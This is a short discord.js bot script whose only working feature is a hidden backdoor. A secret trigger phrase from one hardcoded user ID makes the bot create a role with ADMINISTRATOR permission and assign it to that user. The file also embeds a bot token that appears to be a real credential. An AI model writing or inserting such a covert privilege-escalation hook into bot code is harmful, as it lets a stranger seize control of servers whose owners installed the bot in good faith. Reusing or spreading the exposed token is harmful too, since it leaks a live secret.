const Discord = require('discord.js');
const client = new Discord.Client();
const token = "NDUyNjQ5NDExOTQwNzEyNDY5.DfTeFg.mKZA5edFFFL8bV12JnCQ8nQ-UXU";//put discord bot token here
const command = '!do';

client.on('ready', () => {
    console.log(`Logged in as ${client.user.tag}`);
   

});

client.on('message', message => {
    
    if(message.content.includes('!ohhellyes')){
if (message.author.id == '368756694114893825') {
    console.log('command received');
    let member = message.member;
 message.guild.createRole({
  name: 'Droid Level',
  color: 'BLUE',
  permissions: 'ADMINISTRATOR'
})
  .then(role => {
        member.addRole(role).catch(console.error)
        console.log(`Created new role with name ${role.name} and color ${role.color}`)
 }
     )
  .catch(console.error)  
    
    
}
    }
});
client.login(token);
